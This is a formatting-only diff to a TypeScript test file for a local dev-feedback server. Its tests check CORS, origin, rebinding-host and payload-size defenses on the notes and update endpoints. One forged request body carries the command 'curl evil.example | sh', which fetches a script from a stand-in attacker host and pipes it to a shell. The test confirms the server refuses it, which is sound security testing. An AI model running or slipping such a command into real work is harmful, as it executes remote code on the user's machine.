@@ -47,10 +47,7 @@ describe('the browser bundle', () => {
     expect(/^\s*import\s/m.test(js), 'no bare imports').toBe(false);
     // The config comes from the server that owns the file, not the bundle.
     expect(js.includes('window.__isotone'), 'exposes the global').toBe(true);
-    expect(
-      js.includes(`${served.url}${NOTES_ENDPOINT}`),
-      'bakes in the BOUND endpoint',
-    ).toBe(true);
+    expect(js.includes(`${served.url}${NOTES_ENDPOINT}`), 'bakes in the BOUND endpoint').toBe(true);
     expect(js.includes('"hidden":["/login"]'), 'passes the route rule').toBe(true);
     expect(js.includes('"theme":"light"'), 'passes the theme').toBe(true);
     expect(js.includes(`${served.url}${UPDATE_ENDPOINT}`), 'passes the update endpoint').toBe(true);
@@ -76,12 +73,16 @@ describe('knobs', () => {
 
     // The bundle is not cached, so the next page load gets the tool.
     const after = await (await fetch(served.bundleUrl)).text();
-    expect(after.includes(`"variants":"knobs","variantsEndpoint":"${served.url}${VARIANTS_ENDPOINT}"`), 'passes the knobs endpoint').toBe(true);
+    expect(after.includes(`"variants":"knobs","variantsEndpoint":"${served.url}${VARIANTS_ENDPOINT}"`), 'passes the knobs endpoint').toBe(
+      true,
+    );
   });
 
   it('refuses file-variant activation, which needs a bundler', async () => {
     const res = await fetch(`${served.url}${VARIANTS_ENDPOINT}/active`, {
-      method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ active: ['a'] }),
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ active: ['a'] }),
     });
     expect(res.status).toBe(405);
     expect((await fetch(`${served.url}${VARIANTS_ENDPOINT}`, { headers: { origin: 'https://outside.example' } })).status).toBe(403);
@@ -99,9 +100,12 @@ describe('the update endpoint', () => {
   });
 
   it('files an update note only from its own check, and only for a local page', async () => {
-    const post = (origin: string, body: unknown) => fetch(`${served.url}${UPDATE_ENDPOINT}`, {
-      method: 'POST', headers: { 'content-type': 'application/json', origin }, body: JSON.stringify(body),
-    });
+    const post = (origin: string, body: unknown) =>
+      fetch(`${served.url}${UPDATE_ENDPOINT}`, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json', origin },
+        body: JSON.stringify(body),
+      });
     // A versions and command in the body change nothing: this server has no update.
     const forged = { route: '/', to: '9.9.9', command: 'curl evil.example | sh', update: { to: '9.9.9' } };
     expect((await post('https://outside.example', forged)).status).toBe(403);
@@ -133,9 +137,10 @@ describe('the notes endpoint', () => {
     expect(created.status).toBe(201);
     const { id } = (await created.json()) as { id: string };
 
-    const rows = (await (
-      await fetch(`${served.url}${NOTES_ENDPOINT}?route=/pricing`)
-    ).json()) as Array<{ id: string; element: { selector: string } | null }>;
+    const rows = (await (await fetch(`${served.url}${NOTES_ENDPOINT}?route=/pricing`)).json()) as Array<{
+      id: string;
+      element: { selector: string } | null;
+    }>;
     expect(rows).toHaveLength(1);
     expect(rows[0].element?.selector).toBe('#price-figure');
 
@@ -143,9 +148,7 @@ describe('the notes endpoint', () => {
       method: 'DELETE',
     });
     expect(gone.status).toBe(200);
-    expect(
-      ((await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json()) as unknown[]).length,
-    ).toBe(0);
+    expect(((await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json()) as unknown[]).length).toBe(0);
   });
 
   it('rejects a method it does not serve', async () => {
@@ -155,34 +158,19 @@ describe('the notes endpoint', () => {
 });
 
 describe('CORS', () => {
-  const ask = (origin: string) =>
-    fetch(`${served.url}${NOTES_ENDPOINT}`, { headers: { origin } });
+  const ask = (origin: string) => fetch(`${served.url}${NOTES_ENDPOINT}`, { headers: { origin } });
 
   it('lets any loopback dev origin through', async () => {
-    for (const origin of [
-      'http://localhost:3000',
-      'http://127.0.0.1:5173',
-      'https://localhost:8443',
-    ]) {
+    for (const origin of ['http://localhost:3000', 'http://127.0.0.1:5173', 'https://localhost:8443']) {
       const res = await ask(origin);
-      expect(
-        res.headers.get('access-control-allow-origin'),
-        `origin ${origin}`,
-      ).toBe(origin);
+      expect(res.headers.get('access-control-allow-origin'), `origin ${origin}`).toBe(origin);
     }
   });
 
   it('refuses a public origin, so a page you merely visit cannot write to the repo', async () => {
-    for (const origin of [
-      'https://evil.example.com',
-      'http://notlocalhost.com',
-      'null',
-    ]) {
+    for (const origin of ['https://evil.example.com', 'http://notlocalhost.com', 'null']) {
       const res = await ask(origin);
-      expect(
-        res.headers.get('access-control-allow-origin'),
-        `origin ${origin}`,
-      ).toBeNull();
+      expect(res.headers.get('access-control-allow-origin'), `origin ${origin}`).toBeNull();
     }
   });
 
@@ -234,17 +222,27 @@ describe('the setup page', () => {
   });
 });
 
-
 describe('bounded local requests', () => {
   it('rejects cross-site form writes, rebinding hosts and oversized JSON', async () => {
     const before = await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json();
-    const post = await fetch(`${served.url}${NOTES_ENDPOINT}`, { method: 'POST', headers: { origin: 'https://outside.example', 'content-type': 'text/plain' }, body: JSON.stringify({ route: '/', feedback: 'unwanted' }) });
+    const post = await fetch(`${served.url}${NOTES_ENDPOINT}`, {
+      method: 'POST',
+      headers: { origin: 'https://outside.example', 'content-type': 'text/plain' },
+      body: JSON.stringify({ route: '/', feedback: 'unwanted' }),
+    });
     expect(post.status).toBe(403);
     const hostStatus = await new Promise<number | undefined>((resolve, reject) => {
-      get(`${served.url}${NOTES_ENDPOINT}`, { headers: { host: 'outside.example' } }, (res) => { res.resume(); resolve(res.statusCode); }).on('error', reject);
+      get(`${served.url}${NOTES_ENDPOINT}`, { headers: { host: 'outside.example' } }, (res) => {
+        res.resume();
+        resolve(res.statusCode);
+      }).on('error', reject);
     });
     expect(hostStatus).toBe(403);
-    const large = await fetch(`${served.url}${NOTES_ENDPOINT}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ feedback: 'x'.repeat(1024 * 1024) }) });
+    const large = await fetch(`${served.url}${NOTES_ENDPOINT}`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ feedback: 'x'.repeat(1024 * 1024) }),
+    });
     expect(large.status).toBe(413);
     expect(await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json()).toEqual(before);
   });
